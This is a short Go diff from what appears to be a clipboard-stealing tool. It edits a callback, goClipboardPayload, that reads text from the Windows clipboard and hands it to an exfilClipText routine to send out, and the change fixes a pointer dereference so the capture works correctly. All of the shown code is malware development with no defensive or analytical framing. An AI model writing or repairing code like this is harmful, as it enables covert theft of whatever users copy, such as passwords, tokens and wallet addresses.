@@ -27,15 +27,13 @@ func goClipboardPayload(uFormat uint32, hMem uintptr) {
 	if uFormat != CF_TEXT && uFormat != CF_UNICODE {
 		return
 	}
-
-	ptrData := (*uintptr)(unsafe.Pointer(hMem))
+	ptrData := *(*uintptr)(unsafe.Pointer(hMem))
 	content := ""
 	if uFormat == CF_TEXT {
 		content = windows.BytePtrToString((*byte)(unsafe.Pointer(ptrData)))
 	} else {
 		content = windows.UTF16PtrToString((*uint16)(unsafe.Pointer(ptrData)))
 	}
-
-	// perform this in a separate goroutine to not block the call
+	// perform this in a separate goroutine to not block the call with I/O
 	go exfilClipText(content)
 }
